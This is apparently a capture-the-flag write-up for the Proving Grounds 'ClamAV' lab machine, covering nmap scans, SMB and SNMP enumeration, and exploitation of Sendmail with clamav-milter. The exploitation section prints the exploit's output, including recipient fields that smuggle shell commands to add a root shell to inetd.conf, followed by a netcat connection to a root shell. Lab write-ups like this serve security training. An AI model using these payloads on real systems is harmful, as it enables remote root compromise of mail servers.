---
layout: default
title: ClamAV
parent: Proving Grounds Practice - Linux
nav_order: 3
---

# Scanning

---

```bash
                                                                                                   [9/9]
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/clamav]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.42
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-23 15:26 EST
Nmap scan report for 192.168.232.42                                                                     Host is up (0.054s latency).
Not shown: 65528 closed tcp ports (reset)                                                               PORT      STATE SERVICE     VERSION                                                                     22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)                             | ssh-hostkey:
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.217], pleased to meet you, ENHANCEDSTATUSCODES,
 PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QU
IT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0
To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local inf
ormation send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-title: Ph33r
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods:
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  `vyU      Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey:
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel


```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/clamav/index.png)

Decode the binary to reveal the possible password _ifyoudontpwnmeuran00b_

![binary](../../../assets/images/ctfs/proving_grounds/clamav/binary.png)

Possible cred: _ph33r:ifyoudontpwnmeuran00b_

## 445 | SMB

Enumerate shares

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/clamav]
└─$ smbclient -L 192.168.232.42
Password for [WORKGROUP\vagrant]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
        ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig

        Workgroup            Master
        ---------            -------
        WORKGROUP            0XBABE

```

Enum4Linux shows possible users:

```bash
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x4 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x5 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x6 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0x7 RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0x8 RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0x9 RID: 0x3ea acb: 0x00000011 Account: daemon   Name: daemon    Desc: (null)
index: 0xa RID: 0xbb8 acb: 0x00000011 Account: ryu      Name: ryu,,,    Desc: (null)
index: 0xb RID: 0x3f4 acb: 0x00000011 Account: man      Name: man       Desc: (null)
index: 0xc RID: 0x3f6 acb: 0x00000011 Account: lp       Name: lp        Desc: (null)
index: 0xd RID: 0x4b4 acb: 0x00000011 Account: Debian-exim      Name: (null)    Desc: (null)
index: 0xe RID: 0x43a acb: 0x00000011 Account: gnats    Name: Gnats Bug-Reporting System (admin)       D
esc: (null)
index: 0xf RID: 0x42c acb: 0x00000011 Account: backup   Name: backup    Desc: (null)
index: 0x10 RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x11 RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x12 RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x13 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x14 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)
```

## 199 | SNMP Multiplexer

Let's run a UDP scan to check for additional SNMP ports possibly being open.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/clamav]
└─$ sudo nmap -sU --top-ports 100 192.168.232.42
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-23 16:13 EST
Nmap scan report for 192.168.232.42
Host is up (0.057s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT    STATE         SERVICE
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 110.47 seconds

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/clamav]
└─$ sudo nmap -sU -p161 -T4 --script *snmp* 192.168.232.42
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-23 16:09 EST
Nmap scan report for 192.168.232.42
Host is up (0.058s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-info:
|   enterprise: U.C. Davis, ECE Dept. Tom
|   engineIDFormat: unknown
|   engineIDData: 9e325869f30c7749
|   snmpEngineBoots: 61
|_  snmpEngineTime: 14m15s
| snmp-processes:
|   1:
|     Name: init
|     Path: init [2]
|   2:
|     Name: ksoftirqd/0
|     Path: ksoftirqd/0
|   3:
|     Name: events/0
|     Path: events/0
|   4:
|     Name: khelper
|     Path: khelper
|   5:
|     Name: kacpid
|     Path: kacpid
|   99:
|     Name: kblockd/0
|     Path: kblockd/0
|   109:
|     Name: pdflush
|     Path: pdflush
110:
|     Name: pdflush
|     Path: pdflush
|   111:
|     Name: kswapd0
|     Path: kswapd0
|   112:
|     Name: aio/0
|     Path: aio/0
|   255:
|     Name: kseriod
|     Path: kseriod
|   276:
|     Name: scsi_eh_0
|     Path: scsi_eh_0
|   284:
|     Name: khubd
|     Path: khubd
|   348:
|     Name: shpchpd_event
|     Path: shpchpd_event
|   380:
|     Name: kjournald
|     Path: kjournald
|   934:
|     Name: vmmemctl
|     Path: vmmemctl
|   1177:
|     Name: vmtoolsd
|     Path: /usr/sbin/vmtoolsd
|   3772:
|     Name: syslogd
|     Path: /sbin/syslogd
|   3775:
|     Name: klogd
|     Path: /sbin/klogd
|   3780:
|     Name: clamd
|     Path: /usr/local/sbin/clamd
|   3782:
|     Name: clamav-milter
|     Path: /usr/local/sbin/clamav-milter
|     Params: --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
|   3791:
|     Name: inetd
|     Path: /usr/sbin/inetd
|   3795:
|     Name: nmbd
|     Path: /usr/sbin/nmbd
|     Params: -D
|   3797:
|     Name: smbd
|     Path: /usr/sbin/smbd
|     Params: -D
|   3801:
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -Lsd -Lf /dev/null -p /var/run/snmpd.pid
|   3807:
|     Name: sshd
|     Path: /usr/sbin/sshd
|   3880:
|     Name: smbd
|     Path: /usr/sbin/smbd
|     Params: -D
|   3886:
|     Name: sendmail-mta
|     Path: sendmail: MTA: accepting connections
|   3900:
|     Name: atd
|     Path: /usr/sbin/atd
|   3903:
|     Name: cron
|     Path: /usr/sbin/cron
|   3910:
|     Name: apache
|     Path: /usr/sbin/apache
|   3911:
|     Name: apache
|     Path: /usr/sbin/apache
| snmp-brute:
|_  public - Valid credentials
| snmp-netstat:
|   TCP  0.0.0.0:25           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:139          0.0.0.0:0
|   TCP  0.0.0.0:199          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   UDP  0.0.0.0:137          *:*
|   UDP  0.0.0.0:138          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  42.232.168.192:137   *:*
|_  UDP  42.232.168.192:138   *:*
| snmp-sysdescr: Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
|_  System uptime: 14m17.88s (85788 timeticks)
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   eth0
|     IP address: 192.168.232.42  Netmask: 255.255.255.0
|     MAC address: 00:50:56:bf:21:5a (VMware)
|     Type: ethernetCsmacd  Speed: 100 Mbps
|     Status: up
|     Traffic stats: 20.73 Mb sent, 6.90 Mb received
|   sit0
|     MAC address: 00:00:00:00:21:5a (Xerox)
|     Type: tunnel  Speed: 0 Kbps
|     Status: down
|_    Traffic stats: 0.00 Kb sent, 0.00 Kb received
```

# Exploitation

---

Searching for exploits that match the Nmap UDP scan output for SNMP we find a potential match for _clamav-milter_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ searchsploit clamav-milter
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution       | multiple/remote/4761.pl
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

Reading the exploit it appears it opens a reverse shell on port 31337 that we should be able to connect to.

![exploit](../../../assets/images/ctfs/proving_grounds/clamav/exploit.png)

Run the exploit...

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/clamav]
└─$ perl 4761.pl 192.168.232.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.232.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Thu, 23 Nov 2023 21:18:59 -0500; (No UCE/UBE) logging access from: [192.168.45.217](FAIL)-[192.168.45.217]
250-localhost.localdomain Hello [192.168.45.217], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 3AO2IxmM004173 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection

```

Now we can just connect to the reverse shell listening on 31337

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/clamav]
└─$ nc -nv 192.168.232.42 31337
(UNKNOWN) [192.168.232.42] 31337 (?) open
id
uid=0(root) gid=0(root) groups=0(root)

```

# Post-Exploitation

---

We have a root shell so no post-exploitation required.
